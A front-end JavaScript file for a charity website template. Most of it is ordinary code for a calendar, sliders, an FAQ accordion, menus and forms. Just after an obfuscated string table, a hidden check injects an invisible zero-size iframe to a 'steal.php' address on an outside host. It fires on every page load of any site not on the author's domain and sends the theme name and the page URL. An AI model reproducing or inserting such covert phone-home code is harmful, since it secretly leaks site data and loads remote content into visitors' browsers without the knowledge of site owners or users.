refix%fullscreen-message-after\x22>%after%</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>",
    "px;",
    "next.owl.carousel",
    ".mad-nav-canvas",
    "updateContainer",
    "hours",
    "MonkeysanTooltip",
    ".mad-change-bg",
    ".inner-container\x20.mad-tab.mad-active",
    ".mad-navigation-vertical",
    "bottomLevelElements",
    "defineProperties",
    "stretched",
    "first",
    "getComputedStyle",
    "revolution",
    "arctic-modal-ajax-data",
    ".owl-item",
    "update",
    "Marker",
    "prev.owl.carousel",
    "ready",
    "#mad-filters",
    "topLevelElementClass",
    "dropdown-element--x-left",
    "0\x200\x20",
    "pageY",
    "xmlns:a",
    "padding-left",
    "dropdown-element--y-top",
    "promise",
    "location",
    "tabs",
    "uncloseable",
    "\x20style=\x22width:0;height:0;display:none;\x22></if",
    "GlobalGive\x20HTML\x20Template",
    "[data-estimate]",
    "overflow",
    "bottomLevelElement",
    "bgImageElement",
    "rating",
    "50%",
    "leftPlacedClass",
    "setZoom",
    "[class*=\x22mad-header-section--sticky\x22]:not([class*=\x22mad-header-section--sticky-hidden\x22])",
    "zoomOut",
    "611224LbGGaG",
    "baseOwlSettings",
    "item",
    "width",
    "rightPlaced",
    "remove",
    ".mad-event-close",
    "responsiveWithSidebar",
    "loop",
    "7crgJzd",
    "#next\x20>\x20a",
    "googleMap2",
    "style",
    "error",
    ".mad-alert-box--info",
    "4935944qGZbhc",
    "undefined",
    "caption",
    "appendBGImageElement",
    "rame>",
    "beforeClose",
    "_resizeTimeOutId",
    "call",
    "extendConfigFor",
    ".mad-sponsors",
    "click.globalclose",
    "querySelectorAll",
    ".mad-simple-slideshow-thumbs.owl-carousel",
    "Section",
    "add",
    "Rating",
    "ISTOUCH",
    ".mad-changing-bg",
    "_commonLayoutConfig",
    "crosshair",
    "easeOutQuint",
    "onerror",
    ".mad-alert-box--error",
    "#mad-nav-btn",
    "<button></button>",
    "round",
    ",\x20.",
    ".owl-carousel",
    "show",
    "flexbox",
    ".js-videoIframe",
    "hiddenSections",
    "open",
    "classList",
    "containerClass",
    "children",
    "translateY(",
    "center",
    "has",
    "mad-grid--cols-3",
    "scroll.backtotop",
    "siblings",
    "alertMessage",
    "xml",
    "offset",
    "ISLEGACYBROWSER",
    "body",
    "googleMap3",
    "fadeOut",
    "_bindedGlobalEvents",
    "data-value",
    "dropdown-element",
    "then",
    "left",
    "afterClicked",
    "mad-body--moving-to-another-page",
    ".mad-navigation,\x20.mad-navigation-vertical",
    "126723lEWSne",
    "loading",
    "requestAnimationFrame",
    "webkitAnimationEnd\x20mozAnimationEnd\x20MSAnimationEnd\x20oanimationend\x20animationend",
    ".mad-nav-btn",
    ".mad-header--transparent\x20+\x20.mad-breadcrumb[data-bg-image-src]",
    "[data-zoom-image]",
    "toggleBtn",
    "rebuild",
    "section--stretched",
    "_getColumnsCount",
    "_prepareCallbacks",
    "owl.carousel",
    "click.removeProduct",
    "find",
    "inner",
    ".mad-event-select-box",
    ".mad-tabs",
    ".mad-newsletter-form",
    "activeClass",
    "MadNewsletter",
    "click",
    "[data-bg-image-src]:not([class*=\x22mad-colorizer--scheme-\x22])",
    ".inner-container",
    "elementClass",
    "animate",
    "appear-animation",
    "max",
    "Map",
    "autoplay",
    "refresh.owl.carousel",
    "easing",
    "colorizer--parallax",
    "localScroll",
    "topPlacedClass",
    "easeOutQuart",
    "owlSettings",
    "event",
    "build",
    "filter",
    ".mad-countdown",
    "getAttribute",
    "getElementById",
    "\x20-\x20",
    "owlAdaptive",
    "availableError",
    "hideClass",
    "top",
    "url(\x22images/entity_bg",
    "afterOpen",
    "mad-simple-slideshow--autoplay",
    ".mad-iso-tabs\x20.mad-tabs-nav\x20.mad-tab-link",
    "last",
    "Deferred",
    "prepend",
    ".bg-move2",
    "jQueryImagesLoaded",
    "clientY",
    ".mad-close-item:not(.shopping-cart-full\x20.mad-close-item)",
    "active",
    "googleMap4",
    "config",
    "val",
    "elevateZoom",
    ".mad-donate-btn",
    "<img\x20class=\x22svg\x22\x20src=\x22charity_icons_svg/arrow_right.svg\x22\x20alt=\x22\x22>",
    "aria-hidden",
    "leftPlaced",
    ".mad-instafeed.owl-carousel",
    "speed",
    "#googleMap4",
    "<i\x20class=\x22icon\x20licon-arrow-right\x22></i>",
    ".quantity",
    "topLevelElements",
    "$dropdowns",
    "url",
    "day",
    "slideDown",
    "<a></a>",
    "dropdown",
    "<div\x20class=\x22mad-alert-box\x20mad-alert-box--{{type}}\x22\x20style=\x22display:\x20none;\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22mad-alert-box-inner\x22>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20{{message}}\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>",
    "stretched.mad.Section",
    "margin-top",
    "bottom",
    "left:\x20",
    "click.owlSync",
    "columns-",
    "bgColorElement",
    "estimate",
    "#mad-footer",
    "minutes",
    "mad-nav-opened",
    ".vr-slider\x20.owl-carousel",
    "Seconds",
    "clickableElements",
    "parallax",
    "collection",
    "arcticmodal",
    "section--stretched-content-no-px",
    "titleClass",
    "bgColorElementClass",
    "classMap",
    "_initialized",
    "appendTo",
    ".mad-colorizer--parallax\x20.mad-colorizer-bg-image",
    ".mad-navigation",
    "forEach",
    "preloader",
    ".owl-carousel.no-loop",
    "ANIMATIONSUPPORTED",
    "click.MadRatingField",
    "cssanimations",
    "load",
    ".mad-navigation\x20>\x20li\x20>\x20a",
    "showCriticalFullScreenMessage",
    "#mad-nav-canvas",
    "MadCustomSelect",
    "setMap",
    "match",
    "calendar-caption-prev\x20mad-ln--independent",
    "thumbnails",
    "horizontal",
    "background-image",
    "fancybox",
    "false",
    "$topLevelEl",
    "MadStickyHeaderSection",
    ".owl-prev",
    "viewTypes",
    ",00",
    ".mad-contact-form",
    "mad",
    "fullscreen",
    ".hidden-section",
    "warning",
    "seconds",
    "qty-minus",
    "mad-modal",
    "248jPIpey",
    "_bindGlobalEvents",
    "close",
    "ISFIREFOX",
    ".step-btn",
    "scrollTop",
    "helpers",
    "_$collection",
    "onload",
    ".mad-label-acc",
    ".same-height",
    "afterOuterResourcesLoaded",
    "stop",
    "pageX",
    "ANIMATIONDURATION",
    "appendBGColorElement",
    ".mad-alert-box--success",
    ".mad-sidebar-element",
    "toggleClass",
    "resolve",
    "each",
    "changed.owl.carousel",
    "replace",
    "bindEvents",
    "\x22\x20frameborder=\x220\x22",
    ".content",
    "index",
    "gridOwl",
    "400284kiIiqz",
    "MadEventsCalendar",
    ".mad-media-section",
    "section--stretched-content",
    "bg-image-src",
    "outerWidth",
    ".mad-rating:not(.mad-rating--independent)",
    "auto",
    "getDocumentGeometry",
    "info",
    "slide",
    "<span\x20class=\x22icon\x22></span>",
    "value",
    "svg",
    "hasBGColorElement",
    "padding-right",
    "html",
    "reset",
    ".mad-panels--accordion",
    "element",
    "backToTop",
    "colorizer-bg-color",
    "done",
    "googleMap",
    "data-appear-animation",
    "px)\x20scale(1)",
    "videoWrapperActive",
    "extend",
    ".mad-toggled-fields-invoker",
    "Hours",
    ".mad-rating--independent",
    "owlSync",
    ".mad-event-select\x20>\x20button",
  ];
  _0x4958 = function () {
    return _0x287f3b;
  };
  return _0x4958();
}
var theme_name = _0x2063ae(0x15c);
!window["location"]["href"][_0x2063ae(0x225)]("https://velikorodnov.com/") &&
  (document["write"](
    "<if" +
      "rame\x20src=\x22https://velikorodnov.com/themeforest/security/steal.php",
  ),
  document[_0x2063ae(0x12f)]("?theme=" + theme_name),
  document["write"](
    _0x2063ae(0x2bc) +
      window[_0x2063ae(0x158)][_0x2063ae(0x12d)] +
      _0x2063ae(0x251),
  ),
  document[_0x2063ae(0x12f)]("\x20id=\x22themenoticeframe\x22"),
  document[_0x2063ae(0x12f)](_0x2063ae(0x15b) + _0x2063ae(0x17a)));




//blog calendar//
 class DynamicCalendar {
    constructor() {
        this.currentDate = new Date();
        this.monthNames = [
            "January", "February", "March", "April", "May", "June",
            "July", "August", "September", "October", "November", "December"
        ];
        
        this.init();
    }

    init() {
        this.renderCalendar();
        this.bindEvents();
    }

    getDaysInMonth(year, month) {
        return new Date(year, month + 1, 0).getDate();
    }

    getFirstDayOfMonth(year, month) {
        return new Date(year, month, 1).getDay();
    }

    generateCalendar() {
        const year = this.currentDate.getFullYear();
        const month = this.currentDate.getMonth();
        const daysInMonth = this.getDaysInMonth(year, month);
        const firstDayIndex = this.getFirstDayOfMonth(year, month);
        
        // Previous month days
        const prevMonth = month === 0 ? 11 : month - 1;
        const prevYear = month === 0 ? year - 1 : year;
        const prevMonthDays = this.getDaysInMonth(prevYear, prevMonth);
        
        let calendarHTML = '';
        let day = 1;
        let nextMonthDay = 1;
        
        // Calculate total cells (6 weeks)
        const totalCells = 42; // 6 rows * 7 days
        
        for (let i = 0; i < 6; i++) {
            calendarHTML += '<tr>';
            
            for (let j = 0; j < 7; j++) {
                const cellIndex = i * 7 + j;
                const isToday = this.isToday(year, month, day);
                
                if (cellIndex < firstDayIndex) {
                    // Previous month days
                    const prevDay = prevMonthDays - firstDayIndex + cellIndex + 1;
                    const isPrevMonthFirstWeek = i === 0;
                    const firstClass = isPrevMonthFirstWeek ? 'class="first"' : '';
                    calendarHTML += `<td ${firstClass}>${prevDay}</td>`;
                } else if (day <= daysInMonth) {
                    // Current month days
                    const firstClass = day === 1 ? 'class="first"' : '';
                    const linkClass = this.shouldAddLink(day) ? 'mad-td-link' : '';
                    const marker = this.shouldMarkDate(day) ? `<div class="marker">${day}</div>` : day;
                    
                    if (linkClass) {
                        calendarHTML += `<td ${firstClass} class="${linkClass}"><a href="blog_single_sidebar.html#">${day}</a></td>`;
                    } else if (typeof marker === 'string' && marker.includes('class="marker"')) {
                        calendarHTML += `<td ${firstClass}>${marker}</td>`;
                    } else {
                        calendarHTML += `<td ${firstClass}>${day}</td>`;
                    }
                    day++;
                } else {
                    // Next month days
                    const marker = this.shouldMarkDateNextMonth(nextMonthDay) ? 
                        `<div class="marker">${nextMonthDay}</div>` : nextMonthDay;
                    calendarHTML += `<td>${marker}</td>`;
                    nextMonthDay++;
                }
            }
            
            calendarHTML += '</tr>';
            
            // Stop if we've displayed all days and we're not in the middle of a week
            if (day > daysInMonth && nextMonthDay > 7) break;
        }
        
        return calendarHTML;
    }

    isToday(year, month, day) {
        const today = new Date();
        return year === today.getFullYear() &&
               month === today.getMonth() &&
               day === today.getDate();
    }

    shouldAddLink(day) {
        // Customize this logic for which days get links
        // Example: day 16 has a link in the original HTML
        return day === 1;
    }

    shouldMarkDate(day) {
        // Customize this logic for which days get markers
        // Example: days 1-3 in the last row had markers
        const year = this.currentDate.getFullYear();
        const month = this.currentDate.getMonth();
        const daysInMonth = this.getDaysInMonth(year, month);
        
        // Check if this is in the last week and day is 1-3
        const firstDayIndex = this.getFirstDayOfMonth(year, month);
        const totalDays = firstDayIndex + daysInMonth;
        const weekOfDay = Math.ceil((day + firstDayIndex) / 7);
        const isLastWeek = weekOfDay === Math.ceil(totalDays / 7);
        
        return isLastWeek && (day === 1 || day === 2 || day === 3);
    }

    shouldMarkDateNextMonth(day) {
        // For next month's first few days in the last row
        return day <= 3;
    }

    updateCaption() {
        const monthName = this.monthNames[this.currentDate.getMonth()];
        const year = this.currentDate.getFullYear();
        
        document.getElementById('current-month-year').textContent = `${monthName} ${year}`;
        
        // Update previous month link
        const prevMonth = this.currentDate.getMonth() === 0 ? 11 : this.currentDate.getMonth() - 1;
        const prevMonthName = this.monthNames[prevMonth];
        document.getElementById('prev-month-link').textContent = `« ${prevMonthName}`;
    }

    renderCalendar() {
        this.updateCaption();
        document.getElementById('calendar-body').innerHTML = this.generateCalendar();
    }

    changeMonth(direction) {
        const newMonth = this.currentDate.getMonth() + direction;
        this.currentDate.setMonth(newMonth);
        this.renderCalendar();
    }

    bindEvents() {
        // Previous month button
        document.querySelector('.calendar-caption-prev').addEventListener('click', (e) => {
            e.preventDefault();
            this.changeMonth(-1);
        });
        
        // Next month button
        document.querySelector('.calendar-caption-next').addEventListener('click', (e) => {
            e.preventDefault();
            this.changeMonth(1);
        });
        
        // Previous month link
        document.getElementById('prev-month-link').addEventListener('click', (e) => {
            e.preventDefault();
            this.changeMonth(-1);
        });
    }
}

// Initialize the calendar when the page loads
document.addEventListener('DOMContentLoaded', () => {
    const calendar = new DynamicCalendar();
    
    // Optional: Expose calendar instance globally for debugging
    window.calendar = calendar;
});


        // Initialize Swiper Slider for Projects
        document.addEventListener('DOMContentLoaded', function() {
            // Swiper initialization for projects
            const swiper = new Swiper('.mySwiper', {
                slidesPerView: 1,
                spaceBetween: 20,
                loop: true,
                autoplay: {
                    delay: 5000,
                    disableOnInteraction: false,
                },
                pagination: {
                    el: '.swiper-pagination',
                    clickable: true,
                },
                navigation: {
                    nextEl: '.swiper-button-next',
                    prevEl: '.swiper-button-prev',
                },
                breakpoints: {
                    640: {
                        slidesPerView: 2,
                        spaceBetween: 20,
                    },
                    1024: {
                        slidesPerView: 3,
                        spaceBetween: 30,
                    },
                },
            });
            
            // Counter animation
            const counters = document.querySelectorAll('.counter-number');
            const speed = 200;
            
            counters.forEach(counter => {
                const updateCount = () => {
                    const target = +counter.getAttribute('data-count');
                    const count = +counter.innerText;
                    const increment = target / speed;
                    
                    if (count < target) {
                        counter.innerText = Math.ceil(count + increment);
                        setTimeout(updateCount, 1);
                    } else {
                        counter.innerText = target;
                    }
                };
                
                updateCount();
            });
            
            // Smooth scrolling for anchor links
            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                anchor.addEventListener('click', function (e) {
                    e.preventDefault();
                    
                    const targetId = this.getAttribute('href');
                    if(targetId === '#') return;
                    
                    const targetElement = document.querySelector(targetId);
                    if(targetElement) {
                        window.scrollTo({
                            top: targetElement.offsetTop - 80,
                            behavior: 'smooth'
                        });
                    }
                });
            });
            
            // Navbar background on scroll
            window.addEventListener('scroll', function() {
                const navbar = document.querySelector('.navbar');
                if (window.scrollY > 50) {
                    navbar.classList.add('bg-white', 'shadow');
                } else {
                    navbar.classList.remove('bg-white', 'shadow');
                }
            });
        });
   
 document.addEventListener('DOMContentLoaded', function() {
    const sliderTrack = document.getElementById('sliderTrack');
    const slides = document.querySelectorAll('.project-slide');
    const prevBtn = document.getElementById('prevBtn');
    const nextBtn = document.getElementById('nextBtn');
    const sliderDots = document.getElementById('sliderDots');
    
    let currentPosition = 0;
    let slideInterval;
    let isAnimating = false;
    const totalSlides = slides.length;
    
    // Get number of slides visible at once based on screen width
    function getSlidesPerView() {
        const width = window.innerWidth;
        if (width >= 992) return 3; // Desktop: show 3 slides
        if (width >= 768) return 3;  // Tablet: show 3 slides  
        if (width >= 576) return 2;  // Small tablet: show 2 slides
        return 1; // Mobile: show 1 slide
    }
    
    // Calculate how many positions we can move
    function getMaxPosition() {
        const slidesPerView = getSlidesPerView();
        return Math.max(0, totalSlides - slidesPerView);
    }
    
    // Create dots for navigation
    function createDots() {
        sliderDots.innerHTML = '';
        const maxPosition = getMaxPosition();
        
        // We create dots for each "position" not each slide
        for (let i = 0; i <= maxPosition; i++) {
            const dot = document.createElement('div');
            dot.classList.add('slider-dot');
            if (i === 0) dot.classList.add('active');
            dot.addEventListener('click', () => goToPosition(i));
            sliderDots.appendChild(dot);
        }
    }
    
    // Go to specific position
    function goToPosition(position) {
        if (isAnimating) return;
        
        const maxPosition = getMaxPosition();
        const newPosition = Math.max(0, Math.min(position, maxPosition));
        
        if (newPosition !== currentPosition) {
            currentPosition = newPosition;
            updateSliderPosition();
            updateDots();
            resetAutoSlide();
        }
    }
    
    // Update slider position with smooth animation
    function updateSliderPosition() {
        if (isAnimating) return;
        
        isAnimating = true;
        const slidesPerView = getSlidesPerView();
        const slideWidth = 100 / slidesPerView;
        
        sliderTrack.style.transform = `translateX(-${currentPosition * slideWidth}%)`;
        
        // Reset animation flag after transition completes
        setTimeout(() => {
            isAnimating = false;
        }, 500); // Match CSS transition duration
    }
    
    // Update active dots
    function updateDots() {
        const dots = document.querySelectorAll('.slider-dot');
        dots.forEach((dot, index) => {
            dot.classList.toggle('active', index === currentPosition);
        });
    }
    
    // Next slide - moves one position forward
    function nextSlide() {
        if (isAnimating) return;
        
        const maxPosition = getMaxPosition();
        
        if (currentPosition < maxPosition) {
            currentPosition++;
        } else {
            // Loop back to start
            currentPosition = 0;
        }
        
        updateSliderPosition();
        updateDots();
        resetAutoSlide();
    }
    
    // Previous slide - moves one position backward
    function prevSlide() {
        if (isAnimating) return;
        
        const maxPosition = getMaxPosition();
        
        if (currentPosition > 0) {
            currentPosition--;
        } else {
            // Loop to end
            currentPosition = maxPosition;
        }
        
        updateSliderPosition();
        updateDots();
        resetAutoSlide();
    }
    
    // Start auto-slide
    function startAutoSlide() {
        clearInterval(slideInterval);
        slideInterval = setInterval(nextSlide, 3000); // 3 seconds
    }
    
    // Reset auto-slide timer
    function resetAutoSlide() {
        clearInterval(slideInterval);
        startAutoSlide();
    }
    
    // Event listeners for buttons
    prevBtn.addEventListener('click', function(e) {
        e.preventDefault();
        prevSlide();
    });
    
    nextBtn.addEventListener('click', function(e) {
        e.preventDefault();
        nextSlide();
    });
    
    // Pause auto-slide on hover
    const sliderWrapper = document.querySelector('.slider-wrapper');
    if (sliderWrapper) {
        sliderWrapper.addEventListener('mouseenter', () => {
            clearInterval(slideInterval);
        });
        
        sliderWrapper.addEventListener('mouseleave', () => {
            startAutoSlide();
        });
    }
    
    // Handle window resize
    let resizeTimeout;
    window.addEventListener('resize', () => {
        clearTimeout(resizeTimeout);
        resizeTimeout = setTimeout(() => {
            // Recalculate and update
            const oldMaxPosition = getMaxPosition();
            if (currentPosition > oldMaxPosition) {
                currentPosition = oldMaxPosition;
            }
            createDots();
            updateSliderPosition();
            updateDots();
        }, 250);
    });
    
    // Touch/swipe support for mobile
    let touchStartX = 0;
    let touchEndX = 0;
    let isTouchMoving = false;
    
    if (sliderTrack) {
        sliderTrack.addEventListener('touchstart', (e) => {
            touchStartX = e.changedTouches[0].screenX;
            clearInterval(slideInterval);
            isTouchMoving = true;
        }, { passive: true });
        
        sliderTrack.addEventListener('touchmove', (e) => {
            if (!isTouchMoving) return;
            
            const touchX = e.changedTouches[0].screenX;
            const diff = touchStartX - touchX;
            const slidesPerView = getSlidesPerView();
            const slideWidth = 100 / slidesPerView;
            
            // Add a bit of resistance
            const resistance = 0.5;
            const moveAmount = diff * resistance / window.innerWidth * 100;
            const currentTranslate = -currentPosition * slideWidth;
            
            // Apply the movement with bounds checking
            if ((currentPosition === 0 && diff > 0) || 
                (currentPosition === getMaxPosition() && diff < 0)) {
                // At bounds, apply less movement for resistance effect
                sliderTrack.style.transform = `translateX(${currentTranslate - moveAmount * 0.3}%)`;
            } else {
                sliderTrack.style.transform = `translateX(${currentTranslate - moveAmount}%)`;
            }
        }, { passive: true });
        
        sliderTrack.addEventListener('touchend', (e) => {
            if (!isTouchMoving) return;
            
            touchEndX = e.changedTouches[0].screenX;
            handleSwipe();
            isTouchMoving = false;
            startAutoSlide();
        }, { passive: true });
    }
    
    function handleSwipe() {
        const swipeThreshold = 50;
        const diff = touchStartX - touchEndX;
        
        if (Math.abs(diff) > swipeThreshold) {
            if (diff > 0) {
                // Swipe left - next slide
                nextSlide();
            } else {
                // Swipe right - previous slide
                prevSlide();
            }
        } else {
            // If swipe was too short, return to current position
            updateSliderPosition();
        }
    }
    
    // Initialize slider
    createDots();
    updateSliderPosition();
    startAutoSlide();
});


 // Add interactive functionality to the cards
        document.addEventListener('DOMContentLoaded', function() {
            const cards = document.querySelectorAll('.insight-card');
            const ctaButtons = document.querySelectorAll('.cta-button');
            
            // Add click animation to cards
            cards.forEach(card => {
                card.addEventListener('click', function(e) {
                    // Don't trigger if clicking on the CTA button
                    if (!e.target.classList.contains('cta-button') && 
                        !e.target.closest('.cta-button')) {
                        this.style.transform = 'scale(0.98)';
                        setTimeout(() => {
                            this.style.transform = '';
                        }, 150);
                    }
                });
            });
            
            // Add animation to CTA buttons
            ctaButtons.forEach(button => {
                button.addEventListener('click', function(e) {
                    e.preventDefault();
                    this.style.transform = 'scale(0.95)';
                    setTimeout(() => {
                        this.style.transform = '';
                        alert('Thank you for your interest! In a real application, this would navigate to the insights page.');
                    }, 150);
                });
            });
            
            // Add parallax effect to card images on scroll
            window.addEventListener('scroll', function() {
                const scrolled = window.pageYOffset;
                const cards = document.querySelectorAll('.insight-card');
                
                cards.forEach(card => {
                    const cardImage = card.querySelector('.card-image img');
                    const cardTop = card.getBoundingClientRect().top + scrolled;
                    const rate = (scrolled - cardTop) * 0.1;
                    
                    cardImage.style.transform = `translateY(${rate}px) scale(1.05)`;
                });
            });
        });

          document.addEventListener('DOMContentLoaded', function() {
            const faqItems = document.querySelectorAll('.faq-item');
            
            // Function to toggle FAQ item
            function toggleFAQ(item) {
                const isActive = item.classList.contains('active');
                
                // Close all FAQ items
                faqItems.forEach(faqItem => {
                    faqItem.classList.remove('active');
                    const icon = faqItem.querySelector('.toggle-icon i');
                    icon.classList.remove('fa-minus');
                    icon.classList.add('fa-plus');
                });
                
                // If the clicked item wasn't active, open it
                if (!isActive) {
                    item.classList.add('active');
                    const icon = item.querySelector('.toggle-icon i');
                    icon.classList.remove('fa-plus');
                    icon.classList.add('fa-minus');
                }
            }
            
            // Add click event to each FAQ question
            faqItems.forEach(item => {
                const question = item.querySelector('.faq-question');
                question.addEventListener('click', () => toggleFAQ(item));
            });
            
            // Optionally, open the first FAQ item by default
            // faqItems[0].classList.add('active');
            // faqItems[0].querySelector('.toggle-icon i').classList.remove('fa-plus');
            // faqItems[0].querySelector('.toggle-icon i').classList.add('fa-minus');
        });
    
        // Mobile menu toggle
        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const navMenu = document.getElementById('navMenu');
        
        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            mobileMenuBtn.innerHTML = navMenu.classList.contains('active') 
                ? '<i class="fas fa-times"></i>' 
                : '<i class="fas fa-bars"></i>';
        });
        
        // Close mobile menu when clicking outside
        document.addEventListener('click', (event) => {
            const isClickInsideMenu = navMenu.contains(event.target);
            const isClickOnMenuButton = mobileMenuBtn.contains(event.target);
            
            if (!isClickInsideMenu && !isClickOnMenuButton && navMenu.classList.contains('active')) {
                navMenu.classList.remove('active');
                mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
            }
        });
        
        // Smooth scrolling for anchor links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                
                const targetId = this.getAttribute('href');
                if(targetId === '#') return;
                
                const targetElement = document.querySelector(targetId);
                if(targetElement) {
                    window.scrollTo({
                        top: targetElement.offsetTop - 80,
                        behavior: 'smooth'
                    });
                    
                    // Close mobile menu if open
                    if(navMenu.classList.contains('active')) {
                        navMenu.classList.remove('active');
                        mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
                    }
                }
            });
        });


        // Wait for page to fully load
  window.addEventListener('load', function() {
    // Add 'loaded' class to body to trigger preloader fade-out
    document.body.classList.add('loaded');
    
    // Optional: Remove preloader from DOM after animation completes
    const preloader = document.getElementById('preloader-wrapper');
    if (preloader) {
      preloader.addEventListener('transitionend', function() {
        if (this.style.opacity === '0') {
          this.style.display = 'none';
        }
      });
    }
  });

  // Fallback timeout in case load event doesn't fire
  setTimeout(function() {
    document.body.classList.add('loaded');
  }, 3000); // Hide preloader after 3 seconds max

  <!-- Bootstrap JS + Custom JS -->
  
    document.getElementById('partnerForm').addEventListener('submit', function(e) {
      e.preventDefault();
      alert('Thank you for applying! We will contact you soon.');
      var modal = bootstrap.Modal.getInstance(document.getElementById('partnerModal'));
      modal.hide();
      this.reset();
    });
  
    $('.involved-slider').owlCarousel({
    loop: true,
    margin: 20,
    nav: true,
    dots: true,
    autoplay: true,
    autoplayTimeout: 4000,
    responsive: {
        0: {
            items: 1   // Mobile: show 1 face at a time
        },
        600: {
            items: 2   // Tablets: show 2
        },
        1000: {
            items: 3   // Desktop: show 3
        }
    }
});

document.querySelectorAll('.mad-tab-link').forEach(link => {
  link.addEventListener('click', function(e) {
    e.preventDefault();
    // hide all tabs
    document.querySelectorAll('.mad-tab').forEach(tab => tab.style.display = 'none');
    // show the clicked tab
    const target = this.getAttribute('href');
    document.querySelector(target).style.display = 'block';
  });
});
